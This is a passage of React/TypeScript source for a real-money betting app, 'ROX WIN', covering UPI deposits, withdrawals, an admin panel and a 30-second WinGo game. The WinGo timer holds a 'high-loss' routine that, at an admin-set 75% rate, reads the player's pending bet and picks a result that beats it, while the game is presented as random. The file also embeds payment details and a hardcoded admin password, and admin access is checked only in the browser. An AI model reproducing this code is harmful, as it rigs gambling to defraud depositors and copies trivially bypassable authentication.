import React, { createContext, useContext, useState, useEffect } from 'react';
import {
  User,
  DepositRequest,
  WithdrawalRequest,
  Transaction,
  SupportTicket,
  SupportChatMessage,
  AdminSettings,
  WingoResult,
  UserBet,
} from '../types';
import { sounds } from '../utils/sound';
import { WinLossResultData } from '../components/WinLossModal';

interface AppContextType {
  currentUser: User | null;
  users: User[];
  isAdmin: boolean;
  adminSettings: AdminSettings;
  depositRequests: DepositRequest[];
  withdrawalRequests: WithdrawalRequest[];
  transactions: Transaction[];
  supportTickets: SupportTicket[];
  wingoHistory: WingoResult[];
  userBets: UserBet[];
  currentWingoPeriod: string;
  wingoTimeRemaining: number;
  
  // Auth & Daily Bonus
  login: (phone: string, pass: string) => { success: boolean; error?: string };
  register: (phone: string, pass: string) => { success: boolean; error?: string };
  logout: () => void;
  adminLogin: (phoneOrKey: string, pass?: string) => boolean;
  adminLogout: () => void;
  claimDailyLoginBonus: (day?: number) => { success: boolean; amount?: number; error?: string; day?: number };
  
  // Wallet
  submitDeposit: (amount: number, channel: string, utr: string, screenshotUrl?: string) => { success: boolean; error?: string; request?: DepositRequest };
  submitWithdrawal: (amount: number, method: 'UPI' | 'BANK_CARD' | 'USDT', accountDetails: any) => { success: boolean; error?: string };
  
  // Admin actions
  approveDeposit: (depositId: string, notes?: string) => void;
  rejectDeposit: (depositId: string, notes?: string) => void;
  approveWithdrawal: (withdrawalId: string, notes?: string) => void;
  rejectWithdrawal: (withdrawalId: string, notes?: string) => void;
  updateAdminSettings: (newSettings: Partial<AdminSettings>) => void;
  
  // Support
  createSupportTicket: (category: string, subject: string, message: string) => SupportTicket;
  replyToTicket: (ticketId: string, message: string, asAdmin?: boolean) => void;
  
  // Games & Bot
  placeWingoBet: (amount: number, betOn: string, multiplier: number) => { success: boolean; error?: string };
  placeGenericBet: (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number) => { success: boolean; error?: string };
  settleGenericWin: (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number, winAmount: number, multiplier: number) => void;
  settleGenericLoss: (game: 'aviator' | 'mines' | 'cricket' | 'limbo' | 'slots', amount: number, multiplier?: number) => void;
  lastGameResult: WinLossResultData | null;
  setLastGameResult: React.Dispatch<React.SetStateAction<WinLossResultData | null>>;
  
  // Utility & Audio
  soundMuted: boolean;
  toggleSound: () => boolean;
  refreshUserBalance: () => void;
  toast: (msg: string, type?: 'success' | 'error' | 'info') => void;
  currentToast: { message: string; type: 'success' | 'error' | 'info' } | null;
}

const DEFAULT_SETTINGS: AdminSettings = {
  upiId: '8910968919@fam',
  upiName: 'JISAN KHAN',
  qrImageUrl: '/assets/aistudio/IMG_2506_7b474cb2.png',
  minDeposit: 100,
  maxDeposit: 20000,
  minWithdraw: 100,
  maxWithdraw: 200000,
  supportPhone: '+91 8910968919',
  telegramChannel: 'https://t.me/raxigame',
  botLossRate: 75, // 75% house loss rate (High Loss / Low Win)
  botDifficulty: 'high_loss',
};

// Initial sample Wingo results
const INITIAL_WINGO_HISTORY: WingoResult[] = [
  { period: '20261021100051368', number: 7, color: 'green', size: 'big', timestamp: '2026-10-21 16:53:00' },
  { period: '20261021100051367', number: 2, color: 'red', size: 'small', timestamp: '2026-10-21 16:52:00' },
  { period: '20261021100051366', number: 8, color: 'red', size: 'big', timestamp: '2026-10-21 16:51:00' },
  { period: '20261021100051365', number: 6, color: 'red', size: 'big', timestamp: '2026-10-21 16:50:00' },
  { period: '20261021100051364', number: 9, color: 'green', size: 'big', timestamp: '2026-10-21 16:49:00' },
  { period: '20261021100051363', number: 7, color: 'green', size: 'big', timestamp: '2026-10-21 16:48:00' },
  { period: '20261021100051362', number: 3, color: 'green', size: 'small', timestamp: '2026-10-21 16:47:00' },
];

const AppContext = createContext<AppContextType | undefined>(undefined);

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Load initial persistent storage or defaults
  const [users, setUsers] = useState<User[]>(() => {
    const saved = localStorage.getItem('roxwin_users');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    // Default demo user matching screenshot UID 528774 & phone 8910968919
    return [{
      id: 'usr_demo_1',
      phone: '8910968919',
      name: 'MEMBERNNGFWMJK',
      uid: '528774',
      vipLevel: 0,
      balance: 0.0, // Every new user starts at 0
      createdAt: '2026-10-21 10:00:00',
      lastLogin: new Date().toISOString().replace('T', ' ').substring(0, 19),
      avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=200&auto=format&fit=crop&q=80',
      invitationCode: '77843528774',
    }];
  });

  const [currentUser, setCurrentUser] = useState<User | null>(() => {
    const saved = localStorage.getItem('roxwin_current_user');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return null;
  });

  const [isAdmin, setIsAdmin] = useState<boolean>(() => {
    const savedAdmin = localStorage.getItem('roxwin_is_admin') === 'true';
    const savedUser = localStorage.getItem('roxwin_current_user');
    if (savedAdmin && savedUser) {
      try {
        const u = JSON.parse(savedUser);
        return u.phone === '8910968919';
      } catch (e) {
        return false;
      }
    }
    return false;
  });

  const [adminSettings, setAdminSettings] = useState<AdminSettings>(() => {
    const saved = localStorage.getItem('roxwin_admin_settings');
    if (saved) {
      try { return { ...DEFAULT_SETTINGS, ...JSON.parse(saved) }; } catch (e) { /* ignore */ }
    }
    return DEFAULT_SETTINGS;
  });

  const [depositRequests, setDepositRequests] = useState<DepositRequest[]>(() => {
    const saved = localStorage.getItem('roxwin_deposits');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [
      {
        id: 'dep_sample_1',
        userId: 'usr_demo_1',
        userPhone: '8910968919',
        userName: 'MEMBERNNGFWMJK',
        amount: 500,
        channel: 'Phonepe_QR',
        utr: '429581902847',
        status: 'pending',
        createdAt: '2026-10-21 16:30:15',
      }
    ];
  });

  const [withdrawalRequests, setWithdrawalRequests] = useState<WithdrawalRequest[]>(() => {
    const saved = localStorage.getItem('roxwin_withdrawals');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [];
  });

  const [transactions, setTransactions] = useState<Transaction[]>(() => {
    const saved = localStorage.getItem('roxwin_transactions');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [];
  });

  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    const saved = localStorage.getItem('roxwin_support_tickets');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* ignore */ }
    }
    return [
      {
        id: 'tick_101',
        userId: 'usr_demo_1',
        userName: 'MEMBERNNGFWMJK',
        userPhone: '8910968919',
        category: 'Deposit Not Received',
        subject: 'Deposit verification inquiry',
        status: 'open',
        createdAt: '2026-10-21 16:35:00',
        updatedAt: '2026-10-21 16:35:00',
        messages: [
          {
            id: 'm1',
            sender: 'user',
            senderName: 'MEMBERNNGFWMJK',
            text: 'Hello, I have submitted a deposit of ₹500 with UTR 429581902847. Please verify and approve.',
            timestamp: '16:35',
          },
          {
            id: 'm2',
            sender: 'bot',
            senderName: 'ROX WIN Assistant',
            text: 'Thank you for reaching out! Our verification desk reviews UTRs manually to prevent fraud. An administrator will review your payment shortly.',
            timestamp: '16:35',
          }
        ]
      }
    ];
  });

  const [wingoHistory, setWingoHistory] = useState<WingoResult[]>(INITIAL_WINGO_HISTORY);
  const [userBets, setUserBets] = useState<UserBet[]>([]);
  const [currentWingoPeriod, setCurrentWingoPeriod] = useState<string>('20261021100051369');
  const [wingoTimeRemaining, setWingoTimeRemaining] = useState<number>(27);
  const [currentToast, setCurrentToast] = useState<{ message: string; type: 'success' | 'error' | 'info' } | null>(null);
  const [lastGameResult, setLastGameResult] = useState<WinLossResultData | null>(null);
  const [soundMuted, setSoundMuted] = useState<boolean>(() => sounds.getMuted());

  const toggleSound = () => {
    const muted = sounds.toggleMute();
    setSoundMuted(muted);
    toast(muted ? '🔇 Sound muted' : '🔊 Sound enabled', 'info');
    return muted;
  };

  // Sync to localStorage
  useEffect(() => {
    localStorage.setItem('roxwin_users', JSON.stringify(users));
  }, [users]);

  useEffect(() => {
    if (currentUser) {
      localStorage.setItem('roxwin_current_user', JSON.stringify(currentUser));
    } else {
      localStorage.removeItem('roxwin_current_user');
    }
  }, [currentUser]);

  useEffect(() => {
    localStorage.setItem('roxwin_admin_settings', JSON.stringify(adminSettings));
  }, [adminSettings]);

  useEffect(() => {
    localStorage.setItem('roxwin_deposits', JSON.stringify(depositRequests));
  }, [depositRequests]);

  useEffect(() => {
    localStorage.setItem('roxwin_withdrawals', JSON.stringify(withdrawalRequests));
  }, [withdrawalRequests]);

  useEffect(() => {
    localStorage.setItem('roxwin_transactions', JSON.stringify(transactions));
  }, [transactions]);

  useEffect(() => {
    localStorage.setItem('roxwin_support_tickets', JSON.stringify(supportTickets));
  }, [supportTickets]);

  const toast = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
    setCurrentToast({ message, type });
    setTimeout(() => {
      setCurrentToast((prev) => (prev?.message === message ? null : prev));
    }, 3500);
  };

  // Live Wingo Timer (30-second cycles) with 3-2-1 sound and bot high-loss algorithm
  useEffect(() => {
    const timer = setInterval(() => {
      setWingoTimeRemaining((prev) => {
        // Dramatic countdown sound when timer reaches 3, 2, 1
        if (prev <= 4 && prev >= 2) {
          sounds.playCountdown321(prev - 1);
        } else if (prev <= 6 && prev > 4) {
          sounds.playTick();
        }

        if (prev <= 1) {
          // Resolve round!
          const nextPeriodNum = BigInt(currentWingoPeriod) + 1n;
          const nextPeriod = nextPeriodNum.toString();

          // Bot Algorithm: High loss & Low win
          // Check active pending bets for the current period
          const pendingBets = userBets.filter(
            (b) => b.game === 'wingo' && b.status === 'pending' && (!b.period || b.period === currentWingoPeriod)
          );
          const shouldBotEnforceLoss = Math.random() * 100 < (adminSettings.botLossRate || 75);

          let randomNumber = Math.floor(Math.random() * 10);

          if (pendingBets.length > 0 && shouldBotEnforceLoss) {
            // Find what player bet on and pick opposite
            const firstBet = pendingBets[0].betOn?.toLowerCase() || '';
            if (firstBet === 'big') {
              // Player bet Big (5-9) -> House gives Small (0-4)
              randomNumber = Math.floor(Math.random() * 5);
            } else if (firstBet === 'small') {
              // Player bet Small (0-4) -> House gives Big (5-9)
              randomNumber = 5 + Math.floor(Math.random() * 5);
            } else if (firstBet === 'green') {
              // Player bet Green -> House gives Red (2, 4, 6, 8) or 0
              const redPool = [2, 4, 6, 8, 0];
              randomNumber = redPool[Math.floor(Math.random() * redPool.length)];
            } else if (firstBet === 'red') {
              // Player bet Red -> House gives Green (1, 3, 7, 9) or 5
              const greenPool = [1, 3, 7, 9, 5];
              randomNumber = greenPool[Math.floor(Math.random() * greenPool.length)];
            } else if (firstBet === 'violet') {
              // Player bet Violet -> House gives standard red or green
              const standardPool = [1, 2, 3, 4, 6, 7, 8, 9];
              randomNumber = standardPool[Math.floor(Math.random() * standardPool.length)];
            } else if (!isNaN(Number(firstBet))) {
              // Specific number bet -> House picks a different number
              const numBet = Number(firstBet);
              const remaining = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].filter((n) => n !== numBet);
              randomNumber = remaining[Math.floor(Math.random() * remaining.length)];
            }
          }

          let color: 'green' | 'red' | 'violet-red' | 'violet-green' = 'green';
          if (randomNumber === 0) color = 'violet-red';
          else if (randomNumber === 5) color = 'violet-green';
          else if ([1, 3, 7, 9].includes(randomNumber)) color = 'green';
          else color = 'red';

          const size: 'big' | 'small' = randomNumber >= 5 ? 'big' : 'small';

          const newResult: WingoResult = {
            period: currentWingoPeriod,
            number: randomNumber,
            color,
            size,
            timestamp: new Date().toLocaleTimeString(),
          };

          setWingoHistory((old) => [newResult, ...old.slice(0, 49)]);
          setCurrentWingoPeriod(nextPeriod);

          // Check any active wingo bets
          if (currentUser) {
            setUserBets((bets) => {
              let roundWon = false;
              let totalWin = 0;
              let totalLost = 0;

              const updatedBets: UserBet[] = bets.map((bet) => {
                if (bet.game === 'wingo' && bet.status === 'pending' && (!bet.period || bet.period === currentWingoPeriod)) {
                  let won = false;
                  let mult = 2;
                  if (bet.betOn === color || (bet.betOn === 'violet' && (color === 'violet-red' || color === 'violet-green'))) {
                    won = true;
                    mult = 4.5;
                  } else if (bet.betOn === size) {
                    won = true;
                    mult = 2;
                  } else if (bet.betOn === randomNumber.toString()) {
                    won = true;
                    mult = 9;
                  }

                  if (won) {
                    const winAmount = Number((bet.amount * mult).toFixed(2));
                    roundWon = true;
                    totalWin += winAmount;
                    creditUser(currentUser.id, winAmount, `WinGo Win Period ${currentWingoPeriod} (${bet.betOn})`);
                    return { ...bet, status: 'won' as const, winAmount, multiplier: mult };
                  } else {
                    totalLost += bet.amount;
                    return { ...bet, status: 'lost' as const, winAmount: 0 };
                  }
                }
                return bet;
              });

              // Trigger Win or Loss modal if user had bets in this round!
              if (roundWon && totalWin > 0) {
                setLastGameResult({
                  type: 'win',
                  gameName: 'WinGo 30s',
                  amount: totalWin,
                  period: currentWingoPeriod,
                  results: { color, number: randomNumber, size },
                });
                sounds.playWin();
              } else if (totalLost > 0) {
                setLastGameResult({
                  type: 'loss',
                  gameName: 'WinGo 30s',
                  amount: totalLost,
                  period: currentWingoPeriod,
                  results: { color, number: randomNumber, size },
                });
                sounds.playLoss();
              }

              return updatedBets;
            });
          }

          return 30; // reset to 30 sec
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [currentWingoPeriod, currentUser]);

  const creditUser = (userId: string, amount: number, description: string) => {
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === userId) {
          const updatedBalance = Number((u.balance + amount).toFixed(2));
          return { ...u, balance: updatedBalance };
        }
        return u;
      })
    );

    setCurrentUser((prev) => {
      if (prev && prev.id === userId) {
        return { ...prev, balance: Number((prev.balance + amount).toFixed(2)) };
      }
      return prev;
    });

    const tx: Transaction = {
      id: 'tx_' + Date.now() + Math.random().toString(36).substring(2, 6),
      userId,
      type: amount > 0 ? 'win' : 'bet',
      amount,
      description,
      status: 'completed',
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setTransactions((prev) => [tx, ...prev]);
  };

  const deductUser = (userId: string, amount: number, description: string): boolean => {
    let success = false;
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === userId) {
          if (u.balance >= amount) {
            success = true;
            const updatedReq = Math.max(0, (u.requiredBetToWithdraw || 0) - amount);
            const updatedWagered = (u.totalWagered || 0) + amount;
            return {
              ...u,
              balance: Number((u.balance - amount).toFixed(2)),
              requiredBetToWithdraw: Number(updatedReq.toFixed(2)),
              totalWagered: Number(updatedWagered.toFixed(2)),
            };
          }
        }
        return u;
      })
    );

    if (success) {
      setCurrentUser((prev) => {
        if (prev && prev.id === userId) {
          const updatedReq = Math.max(0, (prev.requiredBetToWithdraw || 0) - amount);
          const updatedWagered = (prev.totalWagered || 0) + amount;
          return {
            ...prev,
            balance: Number((prev.balance - amount).toFixed(2)),
            requiredBetToWithdraw: Number(updatedReq.toFixed(2)),
            totalWagered: Number(updatedWagered.toFixed(2)),
          };
        }
        return prev;
      });

      const tx: Transaction = {
        id: 'tx_' + Date.now() + Math.random().toString(36).substring(2, 6),
        userId,
        type: 'bet',
        amount: -amount,
        description,
        status: 'completed',
        timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
      };
      setTransactions((prev) => [tx, ...prev]);
    }

    return success;
  };

  // Auth & Registration Functions
  const login = (phone: string, pass: string) => {
    const cleanedPhone = phone.trim();
    if (!cleanedPhone || cleanedPhone.length < 5) {
      return { success: false, error: 'Please enter a valid mobile number' };
    }
    if (!pass || pass.length < 4) {
      return { success: false, error: 'Password must be at least 4 characters' };
    }

    // Check if logging in as Admin 8910968919
    const isAdminAccount = cleanedPhone === '8910968919';
    const isCorrectAdminPass = pass === 'jisan321';

    if (isAdminAccount && isCorrectAdminPass) {
      setIsAdmin(true);
      localStorage.setItem('roxwin_is_admin', 'true');
    } else {
      setIsAdmin(false);
      localStorage.removeItem('roxwin_is_admin');
    }

    const found = users.find((u) => u.phone === cleanedPhone);
    if (!found) {
      return {
        success: false,
        error: 'Mobile number not found! Please register a new account to claim your ₹3 welcome bonus.',
      };
    }

    // If regular user, check password if set
    if (found.password && found.password !== pass && !(isAdminAccount && isCorrectAdminPass)) {
      return { success: false, error: 'Incorrect password! Please try again.' };
    }

    // Update last login
    const updatedUser = {
      ...found,
      lastLogin: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };
    setUsers((prev) => prev.map((u) => (u.id === found.id ? updatedUser : u)));
    setCurrentUser(updatedUser);
    if (isAdminAccount && isCorrectAdminPass) {
      toast('👑 Welcome Admin (8910968919)! Admin Panel unlocked.', 'success');
    } else {
      toast(`Welcome back, ${found.name}!`, 'success');
    }
    return { success: true };
  };

  // Register: 1 number can only be used 1 time, starts with ₹3 welcome bonus!
  const register = (phone: string, pass: string) => {
    const cleanedPhone = phone.trim();
    if (!cleanedPhone || cleanedPhone.length < 5) {
      return { success: false, error: 'Please enter a valid mobile number' };
    }
    if (!pass || pass.length < 4) {
      return { success: false, error: 'Password must be at least 4 characters' };
    }

    // Enforce 1-time use per phone number
    const existing = users.find((u) => u.phone === cleanedPhone);
    if (existing) {
      return {
        success: false,
        error: 'This mobile number is already registered! 1 phone number can only register once. Please log in directly.',
      };
    }

    // Generate unique random 6-digit UID
    let randomUid = Math.floor(100000 + Math.random() * 900000).toString();
    while (users.some((u) => u.uid === randomUid)) {
      randomUid = Math.floor(100000 + Math.random() * 900000).toString();
    }
    const isAdminAccount = cleanedPhone === '8910968919' && pass === 'jisan321';

    const newUser: User = {
      id: 'usr_' + Date.now(),
      phone: cleanedPhone,
      name: isAdminAccount ? 'JISAN KHAN (Admin)' : 'MEMBER' + cleanedPhone.slice(-4),
      uid: randomUid,
      vipLevel: isAdminAccount ? 10 : 0,
      balance: 3.0, // Welcome registration bonus: ₹3.00!
      password: pass,
      claimedDays: [],
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      lastLogin: new Date().toISOString().replace('T', ' ').substring(0, 19),
      avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=200&auto=format&fit=crop&q=80',
      invitationCode: Math.floor(10000000000 + Math.random() * 90000000000).toString(),
    };

    setUsers((prev) => [newUser, ...prev]);
    setCurrentUser(newUser);

    // Record welcome bonus transaction
    const tx: Transaction = {
      id: 'tx_bonus_' + Date.now(),
      userId: newUser.id,
      type: 'bonus',
      amount: 3.0,
      description: 'New Member Welcome Bonus',
      status: 'completed',
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };
    setTransactions((prev) => [tx, ...prev]);

    if (isAdminAccount) {
      setIsAdmin(true);
      localStorage.setItem('roxwin_is_admin', 'true');
      toast('👑 Welcome Admin JISAN KHAN (8910968919)! Admin Panel is now unlocked.', 'success');
    } else {
      toast('🎁 Welcome! ₹3.00 New Member Registration Bonus credited to your wallet!', 'success');
      sounds.playWin();
    }
    return { success: true };
  };

  // 7 Days Login Bonus: Day 1: ₹2, Day 2: ₹3, Day 3: ₹4, Day 4: ₹4, Day 5: ₹5, Day 6: ₹5, Day 7: ₹7 = ₹30 Total!
  const claimDailyLoginBonus = (dayNumber?: number) => {
    if (!currentUser) return { success: false, error: 'Please log in to claim your daily bonus' };

    const todayStr = new Date().toISOString().slice(0, 10);
    const claimed = currentUser.claimedDays || [];
    const rewards = [2, 3, 4, 4, 5, 5, 7]; // sum = 30

    const targetDay = dayNumber || ((claimed.length % 7) + 1);

    if (claimed.includes(targetDay) && currentUser.lastDailyClaimDate === todayStr) {
      return {
        success: false,
        error: `Day ${targetDay} already claimed today! Check back tomorrow for Day ${targetDay < 7 ? targetDay + 1 : 1}.`,
      };
    }

    const bonusAmount = rewards[targetDay - 1] || 3;
    const newClaimed = claimed.includes(targetDay) ? claimed : [...claimed, targetDay];

    creditUser(currentUser.id, bonusAmount, `7-Day Sign-in Bonus (Day ${targetDay} - ₹${bonusAmount})`);

    const updated = {
      ...currentUser,
      claimedDays: newClaimed,
      lastDailyClaimDate: todayStr,
    };
    setUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updated : u)));
    setCurrentUser(updated);

    toast(`🎉 Day ${targetDay} bonus claimed! +₹${bonusAmount.toFixed(2)} added to your wallet!`, 'success');
    sounds.playWin();
    return { success: true, amount: bonusAmount, day: targetDay };
  };

  const logout = () => {
    setCurrentUser(null);
    setIsAdmin(false);
    localStorage.removeItem('roxwin_is_admin');
    localStorage.removeItem('roxwin_current_user');
    toast('Logged out successfully', 'info');
  };

  const adminLogin = (phoneOrKey: string, pass?: string) => {
    // Only show/authorize admin 8910968919 pass jisan321
    const isAuthorized =
      (phoneOrKey === '8910968919' && pass === 'jisan321') ||
      (phoneOrKey === 'jisan321') ||
      (pass === 'jisan321');

    if (isAuthorized) {
      setIsAdmin(true);
      localStorage.setItem('roxwin_is_admin', 'true');

      let adminUser = users.find((u) => u.phone === '8910968919');
      if (!adminUser) {
        adminUser = {
          id: 'usr_admin',
          phone: '8910968919',
          name: 'JISAN KHAN (Admin)',
          uid: '528774',
          vipLevel: 10,
          balance: 0.0,
          createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
          lastLogin: new Date().toISOString().replace('T', ' ').substring(0, 19),
          invitationCode: '8910968919',
        };
        setUsers((prev) => [adminUser!, ...prev]);
      }
      setCurrentUser(adminUser);
      toast('👑 Admin Login Verified: 8910968919! Welcome to Admin Panel.', 'success');
      return true;
    }

    toast('❌ Access Denied: Incorrect Admin Mobile or Password', 'error');
    return false;
  };

  const adminLogout = () => {
    setIsAdmin(false);
    localStorage.removeItem('roxwin_is_admin');
    toast('Admin session closed', 'info');
  };

  // Submit deposit: MUST NOT credit wallet balance until verified by Admin!
  const submitDeposit = (amount: number, channel: string, utr: string, screenshotUrl?: string) => {
    if (!currentUser) {
      return { success: false, error: 'Please log in to deposit' };
    }
    if (amount < adminSettings.minDeposit || amount > adminSettings.maxDeposit) {
      return {
        success: false,
        error: `Deposit amount must be between ₹${adminSettings.minDeposit} and ₹${adminSettings.maxDeposit.toLocaleString()}`,
      };
    }
    const cleanUtr = utr.trim();
    if (!cleanUtr || cleanUtr.length < 8) {
      return { success: false, error: 'Please enter a valid 12-digit UTR / Reference number' };
    }

    // Check duplicate UTR
    const existingUtr = depositRequests.find((d) => d.utr.toLowerCase() === cleanUtr.toLowerCase());
    if (existingUtr) {
      return { success: false, error: 'This UTR has already been submitted for verification' };
    }

    const newRequest: DepositRequest = {
      id: 'dep_' + Date.now(),
      userId: currentUser.id,
      userPhone: currentUser.phone,
      userName: currentUser.name,
      amount,
      channel,
      utr: cleanUtr,
      screenshotUrl,
      status: 'pending',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setDepositRequests((prev) => [newRequest, ...prev]);

    // Record pending transaction
    const tx: Transaction = {
      id: 'tx_dep_' + Date.now(),
      userId: currentUser.id,
      type: 'deposit',
      amount,
      description: `Deposit via ${channel} (UTR: ${cleanUtr}) - Pending Verification`,
      status: 'pending',
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
      referenceId: newRequest.id,
    };
    setTransactions((prev) => [tx, ...prev]);

    toast(`Deposit of ₹${amount} submitted! Status: Pending Admin Verification`, 'info');
    return { success: true, request: newRequest };
  };

  // Submit withdrawal: Minimum ₹100, Maximum ₹200,000, requires 100% deposit turnover to be wagered
  const submitWithdrawal = (amount: number, method: 'UPI' | 'BANK_CARD' | 'USDT', accountDetails: any) => {
    if (!currentUser) {
      return { success: false, error: 'Please log in first' };
    }
    if (amount < adminSettings.minWithdraw || amount > adminSettings.maxWithdraw) {
      return {
        success: false,
        error: `Withdrawal amount must be between ₹${adminSettings.minWithdraw} and ₹${adminSettings.maxWithdraw.toLocaleString()}`,
      };
    }
    if (currentUser.balance < amount) {
      return { success: false, error: `Insufficient balance! Your available balance is ₹${currentUser.balance.toFixed(2)}` };
    }

    // Wagering / Turnover Requirement check: "withdraw 100 need to net 100 20000 diposit need to bet able 20000"
    const remainingWager = currentUser.requiredBetToWithdraw || 0;
    if (remainingWager > 0) {
      return {
        success: false,
        error: `Turnover requirement active: You need to bet ₹${remainingWager.toFixed(2)} more before you can withdraw. (100% deposit turnover rule).`,
      };
    }

    // Deduct balance into escrow
    const success = deductUser(currentUser.id, amount, `Withdrawal Request (${method}) - In Review`);
    if (!success) {
      return { success: false, error: 'Failed to process withdrawal balance deduction' };
    }

    const req: WithdrawalRequest = {
      id: 'wdr_' + Date.now(),
      userId: currentUser.id,
      userPhone: currentUser.phone,
      userName: currentUser.name,
      amount,
      method,
      accountDetails,
      status: 'pending',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setWithdrawalRequests((prev) => [req, ...prev]);
    toast(`Withdrawal request of ₹${amount} placed. Status: Pending Admin Approval`, 'success');
    return { success: true };
  };

  // Admin approves deposit: CREDITS WALLET & ADDS 100% WAGER REQUIREMENT (₹100 to ₹20,000)
  const approveDeposit = (depositId: string, notes?: string) => {
    const deposit = depositRequests.find((d) => d.id === depositId);
    if (!deposit || deposit.status !== 'pending') return;

    setDepositRequests((prev) =>
      prev.map((d) =>
        d.id === depositId
          ? { ...d, status: 'approved', reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19), notes }
          : d
      )
    );

    // Credit user's wallet
    creditUser(deposit.userId, deposit.amount, `Deposit Approved (UTR: ${deposit.utr})`);

    // Add 100% betting requirement: user must bet the deposit amount before withdrawing
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === deposit.userId) {
          const currentReq = u.requiredBetToWithdraw || 0;
          return {
            ...u,
            requiredBetToWithdraw: Number((currentReq + deposit.amount).toFixed(2)),
          };
        }
        return u;
      })
    );

    setCurrentUser((prev) => {
      if (prev && prev.id === deposit.userId) {
        const currentReq = prev.requiredBetToWithdraw || 0;
        return {
          ...prev,
          requiredBetToWithdraw: Number((currentReq + deposit.amount).toFixed(2)),
        };
      }
      return prev;
    });

    // Update pending transaction
    setTransactions((prev) =>
      prev.map((t) =>
        t.referenceId === depositId ? { ...t, status: 'completed', description: `Deposit Approved - ₹${deposit.amount}` } : t
      )
    );

    toast(`✅ Deposit #${deposit.utr.slice(-6)} of ₹${deposit.amount} Approved and Credited!`, 'success');
  };

  // Admin rejects deposit
  const rejectDeposit = (depositId: string, notes?: string) => {
    const deposit = depositRequests.find((d) => d.id === depositId);
    if (!deposit || deposit.status !== 'pending') return;

    setDepositRequests((prev) =>
      prev.map((d) =>
        d.id === depositId
          ? { ...d, status: 'rejected', reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19), notes }
          : d
      )
    );

    setTransactions((prev) =>
      prev.map((t) =>
        t.referenceId === depositId ? { ...t, status: 'failed', description: `Deposit Rejected - UTR Unverified` } : t
      )
    );

    toast(`❌ Deposit #${deposit.utr.slice(-6)} Rejected (Unverified Payment)`, 'error');
  };

  // Admin approves withdrawal
  const approveWithdrawal = (withdrawalId: string, notes?: string) => {
    const w = withdrawalRequests.find((req) => req.id === withdrawalId);
    if (!w || w.status !== 'pending') return;

    setWithdrawalRequests((prev) =>
      prev.map((req) =>
        req.id === withdrawalId
          ? { ...req, status: 'completed', reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19), notes }
          : req
      )
    );

    toast(`✅ Withdrawal #${w.id.slice(-6)} of ₹${w.amount} Approved and Paid!`, 'success');
  };

  // Admin rejects withdrawal (refunds balance)
  const rejectWithdrawal = (withdrawalId: string, notes?: string) => {
    const w = withdrawalRequests.find((req) => req.id === withdrawalId);
    if (!w || w.status !== 'pending') return;

    setWithdrawalRequests((prev) =>
      prev.map((req) =>
        req.id === withdrawalId
          ? { ...req, status: 'rejected', reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19), notes }
          : req
      )
    );

    // Refund user balance
    creditUser(w.userId, w.amount, `Withdrawal Rejected - Refund to Balance`);
    toast(`❌ Withdrawal Rejected. ₹${w.amount} refunded to user balance.`, 'info');
  };

  const updateAdminSettings = (newSettings: Partial<AdminSettings>) => {
    setAdminSettings((prev) => ({ ...prev, ...newSettings }));
    toast('Admin Settings & Payment QR Updated!', 'success');
  };

  // Support functions
  const createSupportTicket = (category: string, subject: string, message: string) => {
    const newTicket: SupportTicket = {
      id: 'tick_' + Date.now(),
      userId: currentUser ? currentUser.id : 'guest',
      userName: currentUser ? currentUser.name : 'Guest User',
      userPhone: currentUser ? currentUser.phone : 'N/A',
      category,
      subject,
      status: 'open',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      updatedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      messages: [
        {
          id: 'msg_1',
          sender: 'user',
          senderName: currentUser ? currentUser.name : 'User',
          text: message,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        },
        {
          id: 'msg_2',
          sender: 'bot',
          senderName: 'Customer Care Representative',
          text: 'Thank you for your report. A support executive has been assigned and will reply here.',
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        }
      ],
    };

    setSupportTickets((prev) => [newTicket, ...prev]);
    toast('Support ticket submitted successfully', 'success');
    return newTicket;
  };

  const replyToTicket = (ticketId: string, message: string, asAdmin = false) => {
    if (!message.trim()) return;
    setSupportTickets((prev) =>
      prev.map((ticket) => {
        if (ticket.id === ticketId) {
          const newMsg: SupportChatMessage = {
            id: 'msg_' + Date.now(),
            sender: asAdmin ? 'admin' : 'user',
            senderName: asAdmin ? 'Customer Support Specialist' : (currentUser?.name || 'User'),
            text: message.trim(),
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
          };
          return {
            ...ticket,
